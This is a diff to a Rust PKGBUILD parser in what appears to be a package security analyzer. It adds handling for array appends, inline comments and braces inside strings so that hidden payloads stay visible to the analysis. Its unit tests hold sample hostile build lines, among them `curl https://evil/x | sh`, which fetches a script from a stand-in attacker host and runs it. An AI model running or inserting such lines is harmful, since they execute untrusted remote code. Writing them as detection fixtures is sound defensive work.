@@ -13,11 +13,19 @@ lazy_static! {
     static ref VAR_SIMPLE: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=([^(].*?)$"#).unwrap();
     static ref VAR_QUOTED: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=["'](.*)["']$"#).unwrap();
 
-    // Array patterns
-    static ref ARRAY_SINGLE: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=\((.*)\)$"#).unwrap();
-    static ref ARRAY_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=\($"#).unwrap();
-    // Multi-line array that starts with content on first line
-    static ref ARRAY_MULTILINE_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=\((.+)$"#).unwrap();
+    // Array patterns. Group 2 captures an optional `+` so `name+=(...)` (append)
+    // is parsed instead of silently dropped -- a second `source+=(...)` would
+    // otherwise never reach the source/checksum analyzers. A single-line array
+    // is handled by ARRAY_MULTILINE_START's `ends_with(')')` fast path (its `.+`
+    // also matches the closing paren), so no separate single-line pattern is
+    // needed.
+    static ref ARRAY_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)(\+?)=\($"#).unwrap();
+    // Array that starts with content on the first line (single- or multi-line).
+    static ref ARRAY_MULTILINE_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)(\+?)=\((.+)$"#).unwrap();
+
+    // An assignment-looking line we may fail to fully parse, used only to warn
+    // (never silently drop attacker input without a trace).
+    static ref ASSIGN_LIKE: Regex = Regex::new(r#"^[a-zA-Z_][a-zA-Z0-9_]*\+?=\("#).unwrap();
 
     // Function patterns
     static ref FUNC_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\s*\)\s*\{?"#).unwrap();
@@ -100,38 +108,33 @@ impl StaticParser {
             .collect()
     }
 
-    /// Extract function body starting from a line
+    /// Extract function body starting from a line.
+    ///
+    /// Brace balance is tracked with a quote-aware scanner so a `}` inside a
+    /// string (`echo "}"`) cannot close the function early and push the rest of
+    /// the body -- where a payload could hide -- outside what we parse.
     fn extract_function(&self, lines: &[&str], start_idx: usize) -> Option<(String, usize)> {
-        let mut brace_count = 0;
+        let mut scanner = crate::textutil::BraceScanner::default();
         let mut in_function = false;
         let mut body_lines = Vec::new();
         let mut end_idx = start_idx;
 
         for (i, line) in lines.iter().enumerate().skip(start_idx) {
-            let trimmed = line.trim();
-
-            // Count braces (simplified - doesn't handle strings/comments)
-            for ch in trimmed.chars() {
-                match ch {
-                    '{' => {
-                        brace_count += 1;
-                        in_function = true;
-                    }
-                    '}' => brace_count -= 1,
-                    _ => {}
-                }
+            scanner.feed(line);
+            // `peak > 0` (not `depth > 0`) so a function whose whole body is on
+            // one line (`pkgver() { ...; }`) -- where depth rises to 1 and falls
+            // back to 0 within the same fed line -- is still recognized as
+            // entered and captured.
+            if scanner.peak > 0 {
+                in_function = true;
             }
 
             if in_function {
                 body_lines.push(*line);
-                if brace_count == 0 {
+                if scanner.depth == 0 {
                     end_idx = i;
                     break;
                 }
-            } else if trimmed.ends_with('{') {
-                body_lines.push(*line);
-                brace_count = 1;
-                in_function = true;
             }
         }
 
@@ -163,8 +166,8 @@ impl PkgbuildParser for StaticParser {
         let lines: Vec<&str> = content.lines().collect();
         let mut i = 0;
 
-        // Collect multi-line arrays
-        let mut pending_array: Option<(String, String)> = None;
+        // Collect multi-line arrays: (name, append?, collected-content).
+        let mut pending_array: Option<(String, bool, String)> = None;
 
         while i < lines.len() {
             let line = lines[i];
@@ -176,14 +179,19 @@ impl PkgbuildParser for StaticParser {
                 continue;
             }
 
-            // Handle multi-line array continuation
-            if let Some((name, ref mut collected)) = pending_array.as_mut() {
-                collected.push(' ');
-                collected.push_str(trimmed.trim_end_matches(')'));
+            // Strip a trailing inline comment for matching, e.g.
+            // `source=("x") # note`. The stripper is quote-aware so a `#` inside
+            // a value (a VCS `#commit=` fragment, a URL anchor) is preserved.
+            let code = strip_inline_comment(trimmed);
 
-                if trimmed.ends_with(')') {
+            // Handle multi-line array continuation
+            if let Some((name, append, ref mut collected)) = pending_array.as_mut() {
+                collected.push(' ');
+                collected.push_str(code.trim_end_matches(')'));
+
+                if code.ends_with(')') {
                     let elements = self.parse_array_elements(collected);
-                    self.assign_array(&mut pkgbuild, name, elements);
+                    self.assign_array(&mut pkgbuild, name, elements, *append);
                     pending_array = None;
                 }
                 i += 1;
@@ -191,41 +199,33 @@ impl PkgbuildParser for StaticParser {
             }
 
             // Check for array start (multi-line, empty first line)
-            if let Some(caps) = ARRAY_START.captures(trimmed) {
+            if let Some(caps) = ARRAY_START.captures(code) {
                 let name = caps.get(1).unwrap().as_str().to_string();
-                pending_array = Some((name, String::new()));
+                let append = !caps.get(2).unwrap().as_str().is_empty();
+                pending_array = Some((name, append, String::new()));
                 i += 1;
                 continue;
             }
 
             // Check for multi-line array with content on first line
-            if let Some(caps) = ARRAY_MULTILINE_START.captures(trimmed) {
+            if let Some(caps) = ARRAY_MULTILINE_START.captures(code) {
                 let name = caps.get(1).unwrap().as_str().to_string();
-                let first_content = caps.get(2).unwrap().as_str();
+                let append = !caps.get(2).unwrap().as_str().is_empty();
+                let first_content = caps.get(3).unwrap().as_str();
                 // Check if it actually ends with ) - could be single line
                 if first_content.ends_with(')') {
                     let content = first_content.trim_end_matches(')');
                     let elements = self.parse_array_elements(content);
-                    self.assign_array(&mut pkgbuild, &name, elements);
+                    self.assign_array(&mut pkgbuild, &name, elements, append);
                 } else {
-                    pending_array = Some((name, first_content.to_string()));
+                    pending_array = Some((name, append, first_content.to_string()));
                 }
                 i += 1;
                 continue;
             }
 
-            // Check for single-line array
-            if let Some(caps) = ARRAY_SINGLE.captures(trimmed) {
-                let name = caps.get(1).unwrap().as_str();
-                let content = caps.get(2).unwrap().as_str();
-                let elements = self.parse_array_elements(content);
-                self.assign_array(&mut pkgbuild, name, elements);
-                i += 1;
-                continue;
-            }
-
             // Check for function definition
-            if let Some(caps) = FUNC_START.captures(trimmed) {
+            if let Some(caps) = FUNC_START.captures(code) {
                 let name = caps.get(1).unwrap().as_str().to_string();
                 if let Some((body, end_idx)) = self.extract_function(&lines, i) {
                     pkgbuild.functions.insert(
@@ -243,7 +243,7 @@ impl PkgbuildParser for StaticParser {
             }
 
             // Check for quoted variable assignment
-            if let Some(caps) = VAR_QUOTED.captures(trimmed) {
+            if let Some(caps) = VAR_QUOTED.captures(code) {
                 let name = caps.get(1).unwrap().as_str();
                 let value = caps.get(2).unwrap().as_str();
                 self.assign_variable(&mut pkgbuild, name, value);
@@ -252,7 +252,7 @@ impl PkgbuildParser for StaticParser {
             }
 
             // Check for simple variable assignment
-            if let Some(caps) = VAR_SIMPLE.captures(trimmed) {
+            if let Some(caps) = VAR_SIMPLE.captures(code) {
                 let name = caps.get(1).unwrap().as_str();
                 let value = caps
                     .get(2)
@@ -262,6 +262,14 @@ impl PkgbuildParser for StaticParser {
                 self.assign_variable(&mut pkgbuild, name, value);
                 i += 1;
                 continue;
+            }
+
+            // Nothing matched. If the line *looked* like an array assignment we
+            // could not fully parse, leave a trace rather than dropping
+            // attacker-controlled input unobserved (a silently-dropped
+            // `source+=(...)` would escape source/checksum analysis).
+            if ASSIGN_LIKE.is_match(code) {
+                tracing::debug!("unparsed assignment-like line {}: {:?}", i + 1, code);
             }
 
             i += 1;
@@ -303,28 +311,50 @@ impl StaticParser {
     }
 
     /// Assign an array variable to the PKGBUILD structure
-    fn assign_array(&self, pkgbuild: &mut ParsedPkgbuild, name: &str, elements: Vec<String>) {
-        match name {
-            "pkgname" => pkgbuild.pkgname = elements,
-            "arch" => pkgbuild.arch = elements,
-            "license" => pkgbuild.license = elements,
-            "depends" => pkgbuild.depends = elements,
-            "makedepends" => pkgbuild.makedepends = elements,
-            "checkdepends" => pkgbuild.checkdepends = elements,
-            "optdepends" => pkgbuild.optdepends = elements,
-            "provides" => pkgbuild.provides = elements,
-            "conflicts" => pkgbuild.conflicts = elements,
-            "replaces" => pkgbuild.replaces = elements,
-            "backup" => pkgbuild.backup = elements,
-            "options" => pkgbuild.options = elements,
-            "source" => {
-                pkgbuild.source = elements.iter().map(|s| SourceEntry::parse(s)).collect();
+    /// Assign (or, when `append` is true for a `name+=(...)` form, extend) an
+    /// array field.
+    fn assign_array(
+        &self,
+        pkgbuild: &mut ParsedPkgbuild,
+        name: &str,
+        elements: Vec<String>,
+        append: bool,
+    ) {
+        // For Vec<String> fields: replace, or extend when appending.
+        let set = |dst: &mut Vec<String>, mut new: Vec<String>| {
+            if append {
+                dst.append(&mut new);
+            } else {
+                *dst = new;
             }
-            "md5sums" => pkgbuild.checksums.md5sums = self.parse_checksums(&elements),
-            "sha1sums" => pkgbuild.checksums.sha1sums = self.parse_checksums(&elements),
-            "sha256sums" => pkgbuild.checksums.sha256sums = self.parse_checksums(&elements),
-            "sha512sums" => pkgbuild.checksums.sha512sums = self.parse_checksums(&elements),
-            "b2sums" => pkgbuild.checksums.b2sums = self.parse_checksums(&elements),
+        };
+        match name {
+            "pkgname" => set(&mut pkgbuild.pkgname, elements),
+            "arch" => set(&mut pkgbuild.arch, elements),
+            "license" => set(&mut pkgbuild.license, elements),
+            "depends" => set(&mut pkgbuild.depends, elements),
+            "makedepends" => set(&mut pkgbuild.makedepends, elements),
+            "checkdepends" => set(&mut pkgbuild.checkdepends, elements),
+            "optdepends" => set(&mut pkgbuild.optdepends, elements),
+            "provides" => set(&mut pkgbuild.provides, elements),
+            "conflicts" => set(&mut pkgbuild.conflicts, elements),
+            "replaces" => set(&mut pkgbuild.replaces, elements),
+            "backup" => set(&mut pkgbuild.backup, elements),
+            "options" => set(&mut pkgbuild.options, elements),
+            "source" => {
+                let mut parsed: Vec<SourceEntry> =
+                    elements.iter().map(|s| SourceEntry::parse(s)).collect();
+                if append {
+                    pkgbuild.source.append(&mut parsed);
+                } else {
+                    pkgbuild.source = parsed;
+                }
+            }
+            "md5sums" => self.set_checksums(&mut pkgbuild.checksums.md5sums, &elements, append),
+            "sha1sums" => self.set_checksums(&mut pkgbuild.checksums.sha1sums, &elements, append),
+            "sha256sums" => self.set_checksums(&mut pkgbuild.checksums.sha256sums, &elements, append),
+            "sha512sums" => self.set_checksums(&mut pkgbuild.checksums.sha512sums, &elements, append),
+            "b2sums" => self.set_checksums(&mut pkgbuild.checksums.b2sums, &elements, append),
             _ => {
                 // Store as JSON array in variables
                 pkgbuild
@@ -333,6 +363,56 @@ impl StaticParser {
             }
         }
     }
+
+    /// Replace or extend a checksum array, mapping `SKIP`/empty to `None`.
+    fn set_checksums(&self, dst: &mut Vec<Option<String>>, elements: &[String], append: bool) {
+        let mut parsed = self.parse_checksums(elements);
+        if append {
+            dst.append(&mut parsed);
+        } else {
+            *dst = parsed;
+        }
+    }
+}
+
+/// Truncate a line at a trailing inline comment, preserving `#` characters that
+/// appear inside single/double quotes (so a VCS `#commit=` fragment or a URL
+/// anchor in a quoted source value is not mistaken for a comment). A `#` only
+/// starts a comment when it is unquoted and preceded by whitespace (or starts
+/// the line) -- matching how the shell tokenizes comments.
+fn strip_inline_comment(line: &str) -> &str {
+    let bytes = line.as_bytes();
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut escaped = false;
+    let mut prev_ws = true; // start-of-line counts as a word boundary
+    for (i, &b) in bytes.iter().enumerate() {
+        if escaped {
+            escaped = false;
+            prev_ws = false;
+            continue;
+        }
+        match b {
+            b'\\' if !in_single => {
+                escaped = true;
+                prev_ws = false;
+            }
+            b'\'' if !in_double => {
+                in_single = !in_single;
+                prev_ws = false;
+            }
+            b'"' if !in_single => {
+                in_double = !in_double;
+                prev_ws = false;
+            }
+            b'#' if !in_single && !in_double && prev_ws => {
+                return line[..i].trim_end();
+            }
+            b' ' | b'\t' => prev_ws = true,
+            _ => prev_ws = false,
+        }
+    }
+    line
 }
 
 #[cfg(test)]
@@ -395,6 +475,62 @@ package() {
         let parser = StaticParser::new();
         let result = parser.parse("");
         assert!(matches!(result, Err(ParseError::EmptyContent)));
+    }
+
+    #[test]
+    fn append_and_inline_comment_sources_are_parsed() {
+        // ME-9: `source+=(...)` must extend (not be dropped), a trailing inline
+        // comment must not break array parsing, and a `#commit=` fragment inside
+        // a quoted value must be preserved (not treated as a comment).
+        let parser = StaticParser::new();
+        let content = concat!(
+            "pkgname=t\npkgver=1\npkgrel=1\n",
+            "source=(\"https://example.com/a.tar.gz\") # primary\n",
+            "source+=(\"git+https://github.com/u/r.git#commit=deadbeef\")\n",
+        );
+        let result = parser.parse(content).unwrap();
+        assert_eq!(result.source.len(), 2, "append must extend the source array");
+        assert_eq!(result.source[0].url, "https://example.com/a.tar.gz");
+        // The fragment survived (the `#` was not stripped as a comment).
+        assert_eq!(result.source[1].fragment.as_deref(), Some("commit=deadbeef"));
+        assert!(result.source[1].is_vcs_pinned_commit());
+    }
+
+    #[test]
+    fn single_line_function_body_is_captured() {
+        // Regression: a function whose whole body is on one line must still be
+        // captured so function-scoped analyzers (privilege, FUNC-001) see it.
+        let parser = StaticParser::new();
+        let content = "pkgname=t\npkgver=1\npkgrel=1\npackage() { install -Dm755 evil \"$pkgdir/x\"; }\n";
+        let result = parser.parse(content).unwrap();
+        let body = &result.functions.get("package").expect("package() captured").content;
+        assert!(body.contains("install -Dm755 evil"), "one-line body must be captured: {body}");
+    }
+
+    #[test]
+    fn comment_brace_does_not_truncate_function_body() {
+        // The `}` in a comment must not end the function early and hide the
+        // sudo line from the body.
+        let parser = StaticParser::new();
+        let content = "pkgname=t\npkgver=1\npkgrel=1\nbuild() {\n  : # note }\n  sudo evil-thing\n}\n";
+        let result = parser.parse(content).unwrap();
+        let body = &result.functions.get("build").expect("build captured").content;
+        assert!(body.contains("sudo evil-thing"), "payload after comment-brace must stay in body: {body}");
+    }
+
+    #[test]
+    fn brace_in_string_does_not_truncate_function_body() {
+        // HI-6e: a `}` inside a quoted string must not close the function early.
+        // The payload after it must remain part of the parsed build() body so the
+        // privilege/pattern analyzers still see it.
+        let parser = StaticParser::new();
+        let content = "pkgname=t\npkgver=1\npkgrel=1\n\nbuild() {\n  echo \"}\"\n  curl https://evil/x | sh\n}\n";
+        let result = parser.parse(content).unwrap();
+        let body = &result.functions.get("build").expect("build present").content;
+        assert!(
+            body.contains("curl https://evil/x | sh"),
+            "payload after `echo \"}}\"` must stay in the body, got:\n{body}"
+        );
     }
 
     #[test]
